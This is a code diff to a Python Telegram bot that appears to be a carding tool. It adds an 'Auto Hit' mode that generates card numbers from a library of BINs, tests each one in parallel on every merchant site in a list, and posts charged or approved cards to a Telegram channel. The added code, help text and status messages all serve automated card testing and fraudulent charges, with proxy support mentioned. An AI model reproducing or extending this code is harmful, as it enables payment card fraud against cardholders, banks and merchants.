@@ -271,8 +271,9 @@ def main_menu_keyboard():
         [InlineKeyboardButton("🏦 𝐁𝐈𝐍 𝐋𝐨𝐨𝐤𝐮𝐩", callback_data="btn_bin"),
          InlineKeyboardButton("🎲 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞", callback_data="btn_gen")],
         [InlineKeyboardButton("⚡ 𝐀𝐮𝐭𝐨 𝐂𝐡𝐞𝐜𝐤", callback_data="btn_autochk"),
-         InlineKeyboardButton("🛑 𝐒𝐭𝐨𝐩", callback_data="btn_stop")],
-        [InlineKeyboardButton("❓ 𝐇𝐞𝐥𝐩", callback_data="btn_help")],
+         InlineKeyboardButton("🔥 𝐀𝐮𝐭𝐨 𝐇𝐢𝐭", callback_data="btn_autohit")],
+        [InlineKeyboardButton("🛑 𝐒𝐭𝐨𝐩", callback_data="btn_stop"),
+         InlineKeyboardButton("❓ 𝐇𝐞𝐥𝐩", callback_data="btn_help")],
     ])
 
 
@@ -548,6 +549,26 @@ async def button_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
+    if data == "btn_autohit":
+        user_id = update.effective_user.id
+        if user_id in active_sessions:
+            await query.edit_message_text(
+                "A session is already running. Stop it first with 🛑 Stop.",
+                reply_markup=main_menu_keyboard(),
+            )
+            return
+        await query.edit_message_text(
+            "🔥 <b>Starting Auto Hit...</b>\n\n"
+            "Using all BINs from library + all sites.\n"
+            "Cards generated → checked on ALL sites at once.\n"
+            "Press 🛑 Stop or /stop to halt.",
+            parse_mode="HTML",
+        )
+        asyncio.create_task(
+            run_autohit(update, context, user_id, query.message)
+        )
+        return
+
     if data == "btn_stop":
         user_id = update.effective_user.id
         if user_id in active_sessions:
@@ -574,13 +595,19 @@ async def button_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "🏦 <b>BIN Lookup</b> — /bin <code>123456</code>\n"
             "🎲 <b>Generate</b> — /gen <code>bin [count]</code>\n"
             "⚡ <b>Auto Check</b> — Continuous BIN checker (button or /autochk)\n"
-            "🛑 <b>Stop</b> — /stop to halt running Auto Check\n\n"
+            "🔥 <b>Auto Hit</b> — All BINs × All Sites parallel checker\n"
+            "🛑 <b>Stop</b> — /stop to halt running session\n\n"
             "<b>Auto Check Features:</b>\n"
             "• BIN Library (33,000+ BINs from 200+ countries)\n"
             "• Browse by country, search, or random BIN\n"
             "• Proxy support (optional)\n"
-            "• Runs continuously until you press Stop\n"
-            "• Live status updates every 5 seconds\n"
+            "• Runs continuously until you press Stop\n\n"
+            "<b>Auto Hit Features:</b>\n"
+            "• Uses ALL BINs from library + ALL sites\n"
+            "• Generate cards → check on all sites at once\n"
+            "• Parallel checking for maximum speed\n"
+            "• 3-5 sec between batches, runs until stopped\n"
+            "• Live status every 5 seconds\n"
             "• Charged/Approved CCs posted to channel\n\n"
             "<b>𝐅𝐨𝐫𝐦𝐚𝐭𝐬:</b>\n"
             "Card: <code>cc_number|mm|yy|cvv</code>\n"
@@ -746,6 +773,25 @@ async def autochk_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 
+async def autohit_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admin(update):
+        await deny(update)
+        return
+    user_id = update.effective_user.id
+    if user_id in active_sessions:
+        await update.message.reply_text(
+            "A session is already running. /stop it first.",
+            reply_markup=main_menu_keyboard(),
+        )
+        return
+    msg = await update.message.reply_text(
+        "🔥 <b>Starting Auto Hit...</b>\n"
+        "All BINs × All Sites. Press /stop to halt.",
+        parse_mode="HTML",
+    )
+    asyncio.create_task(run_autohit(update, context, user_id, msg))
+
+
 async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update):
         await deny(update)
@@ -777,15 +823,12 @@ async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "🏦 /bin <code>123456</code> — BIN lookup\n"
         "🎲 /gen <code>bin [count]</code> — Generate cards from BIN\n"
         "⚡ /autochk <code>bin site</code> — Continuous auto check\n"
-        "🛑 /stop — Stop running auto check\n"
+        "🔥 /autohit — All BINs × All Sites parallel\n"
+        "🛑 /stop — Stop running session\n"
         "/start — Show button menu\n\n"
-        "<b>Auto Check Features:</b>\n"
-        "• BIN Library (33,000+ BINs, 200+ countries)\n"
-        "• Browse by country / Search / Random\n"
-        "• Optional Proxy support\n"
-        "• Runs infinitely until /stop\n"
-        "• Live status every 5 sec\n"
-        "• Hits posted to channel\n\n"
+        "<b>Auto Hit:</b> All BINs × All Sites at once.\n"
+        "Cards generated → checked on all sites simultaneously.\n"
+        "3-5 sec batches, runs until /stop.\n\n"
         "𝐃𝐞𝐯 ➜ @Xoarch"
     )
     await update.message.reply_text(text, parse_mode="HTML", reply_markup=main_menu_keyboard())
@@ -1396,6 +1439,246 @@ async def run_continuous_autochk(update: Update, context: ContextTypes.DEFAULT_T
         logger.error(f"Channel summary error: {e}")
 
 
+async def _load_sites():
+    sites_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'sites.txt')
+    if not os.path.isfile(sites_path):
+        return []
+    with open(sites_path, 'r', encoding='utf-8') as f:
+        sites = list({l.strip() for l in f if l.strip()})
+    return sites
+
+
+async def _check_card_on_site(parts, site, proxy_str=None):
+    try:
+        success, message, gateway, price, currency = await process_card(
+            parts['cc'], parts['mes'], parts['ano'], parts['cvv'], site, None, proxy_str
+        )
+        category = classify_result(success, message)
+        return {
+            'site': site,
+            'success': success,
+            'message': message,
+            'gateway': gateway,
+            'price': price,
+            'currency': currency,
+            'category': category,
+        }
+    except Exception as e:
+        return {
+            'site': site,
+            'success': False,
+            'message': str(e),
+            'gateway': '',
+            'price': '0',
+            'currency': 'USD',
+            'category': 'error',
+        }
+
+
+async def run_autohit(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int, status_msg):
+    sites = await _load_sites()
+    if not sites:
+        try:
+            await status_msg.edit_text(
+                "No sites found in sites.txt. Add sites first.",
+                reply_markup=main_menu_keyboard(),
+            )
+        except Exception:
+            pass
+        return
+
+    if not BIN_LIBRARY:
+        try:
+            await status_msg.edit_text(
+                "BIN Library is empty. Add BINs first.",
+                reply_markup=main_menu_keyboard(),
+            )
+        except Exception:
+            pass
+        return
+
+    session = {
+        'running': True,
+        'stats': {'charged': 0, 'approved': 0, 'tds': 0, 'declined': 0, 'error': 0},
+        'total': 0,
+        'bins_used': 0,
+        'sites_count': len(sites),
+        'start_time': time.time(),
+    }
+    active_sessions[user_id] = session
+
+    try:
+        await status_msg.edit_text(
+            f"🔥 <b>𝐀𝐔𝐓𝐎 𝐇𝐈𝐓 𝐑𝐔𝐍𝐍𝐈𝐍𝐆</b>\n"
+            f"━━━━━━━━━━━━━━\n"
+            f"📚 BINs: {len(BIN_LIBRARY)} | 🌐 Sites: {len(sites)}\n"
+            f"━━━━━━━━━━━━━━\n"
+            f"Generating cards from random BINs...\n"
+            f"Each card checked on ALL sites at once.\n"
+            f"Press 🛑 STOP or /stop to halt.",
+            parse_mode="HTML",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("🛑 𝐒𝐓𝐎𝐏", callback_data="btn_stop")]
+            ]),
+        )
+    except Exception:
+        pass
+
+    last_status_update = time.time()
+    bin_index = 0
+    shuffled_bins = list(BIN_LIBRARY)
+    random.shuffle(shuffled_bins)
+
+    while session['running']:
+        if bin_index >= len(shuffled_bins):
+            random.shuffle(shuffled_bins)
+            bin_index = 0
+
+        bin_entry = shuffled_bins[bin_index]
+        bin_index += 1
+        bin_str = bin_entry['bin']
+        session['bins_used'] += 1
+
+        cards = generate_cards_from_bin(bin_str, 5)
+        if not cards:
+            continue
+
+        for cc_string in cards:
+            if not session['running']:
+                break
+
+            try:
+                parts = parse_cc_string(cc_string)
+            except Exception:
+                session['stats']['error'] += 1
+                session['total'] += 1
+                continue
+
+            bin6 = parts['cc'][:6]
+            info = await get_bin_info(bin6)
+            info_str = fmt_info(info['brand'], info['type'], info['level'])
+
+            tasks = [_check_card_on_site(parts, s) for s in sites]
+            results = await asyncio.gather(*tasks, return_exceptions=True)
+
+            for res in results:
+                if not session['running']:
+                    break
+                if isinstance(res, Exception):
+                    session['stats']['error'] += 1
+                    session['total'] += 1
+                    continue
+
+                cat = res['category']
+                session['stats'][cat] += 1
+                session['total'] += 1
+
+                if cat in ('charged', 'approved', 'tds'):
+                    appr_clean = approved_message(res['message']) if cat == 'approved' else None
+                    clean = appr_clean if appr_clean else extract_clean_response(res['message'])
+                    if cat == 'charged':
+                        clean = 'ORDER_PLACED'
+                    elif cat == 'tds':
+                        clean = 'OTP_REQUIRED'
+
+                    price_fmt = fmt_price(res['price'], res['currency'])
+                    result_text = (
+                        f"<b>🔥 𝐀𝐔𝐓𝐎 𝐇𝐈𝐓 𝐑𝐄𝐒𝐔𝐋𝐓</b>\n"
+                        f"━━━━━━━━━━━━━━\n"
+                        f"𝐂𝐂: <code>{cc_string}</code>\n"
+                        f"𝐒𝐭𝐚𝐭𝐮𝐬: {'𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥' if cat == 'charged' else '𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅' if cat == 'approved' else '𝟑𝐃𝐒 ❎'}\n"
+                        f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{clean}</code>\n"
+                        f"𝐏𝐫𝐢𝐜𝐞: {price_fmt}\n"
+                        f"𝐒𝐢𝐭𝐞: <code>{res['site']}</code>\n"
+                        f"━━━━━━━━━━━━━━\n"
+                        f"𝙄𝙣𝙛𝙤: {info_str}\n"
+                        f"𝘽𝙖𝙣𝙠: {info['bank']}\n"
+                        f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {info['country']} {info['flag']}\n"
+                        f"━━━━━━━━━━━━━━\n"
+                        f"𝐃𝐞𝐯 ➜ @Xoarch"
+                    )
+                    try:
+                        await context.bot.send_message(
+                            chat_id=CHANNEL_ID, text=result_text, parse_mode="HTML"
+                        )
+                    except Exception as e:
+                        logger.error(f"Channel post error: {e}")
+                    try:
+                        chat_id = update.effective_chat.id
+                        await context.bot.send_message(
+                            chat_id=chat_id, text=result_text, parse_mode="HTML"
+                        )
+                    except Exception:
+                        pass
+
+            now = time.time()
+            if now - last_status_update >= 5:
+                last_status_update = now
+                elapsed = int(now - session['start_time'])
+                mins, secs = divmod(elapsed, 60)
+                stats = session['stats']
+                current_bin = f"{bin_str} ({bin_entry.get('brand', '?')} - {bin_entry.get('country', '?')})"
+                try:
+                    await status_msg.edit_text(
+                        f"🔥 <b>𝐀𝐔𝐓𝐎 𝐇𝐈𝐓 𝐑𝐔𝐍𝐍𝐈𝐍𝐆</b>\n"
+                        f"━━━━━━━━━━━━━━\n"
+                        f"📚 BINs: {len(BIN_LIBRARY)} | 🌐 Sites: {len(sites)}\n"
+                        f"𝐂𝐮𝐫𝐫𝐞𝐧𝐭 𝐁𝐈𝐍: <code>{current_bin}</code>\n"
+                        f"━━━━━━━━━━━━━━\n"
+                        f"𝐒𝐜𝐚𝐧𝐧𝐞𝐝: {session['total']} | BINs tried: {session['bins_used']}\n"
+                        f"⏱ {mins}m {secs}s\n\n"
+                        f"🔥 Charged: {stats['charged']}\n"
+                        f"✅ Approved: {stats['approved']}\n"
+                        f"❎ 3DS: {stats['tds']}\n"
+                        f"❌ Declined: {stats['declined']}\n"
+                        f"⚠️ Errors: {stats['error']}\n"
+                        f"━━━━━━━━━━━━━━\n"
+                        f"Press 🛑 STOP or /stop to halt",
+                        parse_mode="HTML",
+                        reply_markup=InlineKeyboardMarkup([
+                            [InlineKeyboardButton("🛑 𝐒𝐓𝐎𝐏", callback_data="btn_stop")]
+                        ]),
+                    )
+                except Exception:
+                    pass
+
+            if session['running']:
+                await asyncio.sleep(random.uniform(3, 5))
+
+    # Session ended
+    if user_id in active_sessions:
+        del active_sessions[user_id]
+
+    elapsed = int(time.time() - session['start_time'])
+    mins, secs = divmod(elapsed, 60)
+    stats = session['stats']
+    summary = (
+        f"<b>🔥 𝐀𝐔𝐓𝐎 𝐇𝐈𝐓 𝐒𝐓𝐎𝐏𝐏𝐄𝐃</b>\n"
+        f"━━━━━━━━━━━━━━\n"
+        f"📚 BINs used: {session['bins_used']} / {len(BIN_LIBRARY)}\n"
+        f"🌐 Sites: {len(sites)}\n"
+        f"⏱ Duration: {mins}m {secs}s\n"
+        f"━━━━━━━━━━━━━━\n"
+        f"𝐓𝐨𝐭𝐚𝐥 𝐂𝐡𝐞𝐜𝐤𝐞𝐝: {session['total']}\n\n"
+        f"𝐂𝐡𝐚𝐫𝐠𝐞𝐝: {stats['charged']} 🔥\n"
+        f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝: {stats['approved']} ✅\n"
+        f"𝟑𝐃𝐒: {stats['tds']} ❎\n"
+        f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: {stats['declined']} ❌\n"
+        f"𝐄𝐫𝐫𝐨𝐫𝐬: {stats['error']} ⚠️\n"
+        f"━━━━━━━━━━━━━━\n"
+        f"𝐃𝐞𝐯 ➜ @Xoarch"
+    )
+    try:
+        await status_msg.edit_text(summary, parse_mode="HTML", reply_markup=main_menu_keyboard())
+    except Exception:
+        pass
+
+    try:
+        await context.bot.send_message(chat_id=CHANNEL_ID, text=summary, parse_mode="HTML")
+    except Exception as e:
+        logger.error(f"Channel summary error: {e}")
+
+
 async def handle_bin_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
     bin6 = text.strip()[:6]
     if not bin6.isdigit() or len(bin6) < 6:
@@ -1434,6 +1717,7 @@ def build_app():
     app.add_handler(CommandHandler("bin", bin_cmd))
     app.add_handler(CommandHandler("gen", gen_cmd))
     app.add_handler(CommandHandler("autochk", autochk_cmd))
+    app.add_handler(CommandHandler("autohit", autohit_cmd))
     app.add_handler(CommandHandler("stop", stop_cmd))
     app.add_handler(CallbackQueryHandler(button_router))
     app.add_handler(MessageHandler(filters.Document.ALL, file_handler))
